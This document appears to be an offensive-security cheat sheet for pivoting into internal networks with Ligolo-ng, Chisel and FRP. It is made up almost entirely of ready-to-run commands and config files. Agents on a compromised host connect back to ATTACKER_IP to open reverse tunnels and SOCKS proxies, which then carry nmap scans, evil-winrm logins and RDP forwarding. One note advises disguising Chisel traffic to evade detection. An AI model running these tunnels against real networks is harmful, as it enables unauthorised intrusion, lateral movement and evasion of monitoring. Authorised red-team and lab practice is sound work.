# FRP / Chisel / Ligolo-ng Pivoting

## Ligolo-ng (recommended — full IP routing via TUN)

```bash
# Attacker: start proxy with self-signed cert
./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot host (Windows or Linux)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Attacker: in ligolo-ng console
session                          # select agent session
ifconfig                         # view internal interfaces on pivot
start                            # activate tunnel

# Attacker OS: create TUN interface and add route
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.1.0/24 dev ligolo   # internal subnet

# Access internal targets directly
nmap -sT -p 445,80,443 192.168.1.0/24
```

**Multiple hops**: on the second pivot host, run agent connecting to first pivot (listener forwarded via ligolo).

---

## Chisel (HTTP transport, outbound-only firewall)

```bash
# Attacker: start server
chisel server -p 8080 --reverse

# Pivot host: SOCKS5 reverse proxy
chisel client ATTACKER_IP:8080 R:1080:socks

# Pivot host: specific port forward (e.g. RDP to internal host)
chisel client ATTACKER_IP:8080 R:3389:192.168.1.10:3389

# Attacker: use via proxychains
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -p 445 192.168.1.10
proxychains evil-winrm -i 192.168.1.10 -u admin -p pass
```

**Detection note**: Chisel traffic looks like HTTP upgrade to WebSocket. Use `--header` to blend with normal traffic if needed.

---

## FRP (persistent SOCKS5 with auth)

**frps.ini (attacker server)**
```ini
[common]
bind_port = 7000
```

**frpc.ini (pivot host)**
```ini
[common]
server_addr = ATTACKER_IP
server_port = 7000

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
plugin_user = admin
plugin_passwd = password123
```

```bash
# Attacker
./frps -c frps.ini

# Pivot host
./frpc -c frpc.ini

# Attacker: proxychains through SOCKS5 on 1080
proxychains curl http://192.168.1.20/
```

**TCP port forward variant (frpc.ini)**
```ini
[rdp_internal]
type = tcp
local_ip = 192.168.1.10
local_port = 3389
remote_port = 13389
```
Access via `ATTACKER_IP:13389` directly.

---

## proxychains config template

```
# /etc/proxychains4.conf
strict_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1  1080
```

For NTLM-authenticated tools, prefer `dynamic_chain` + multiple proxies when chaining pivots.
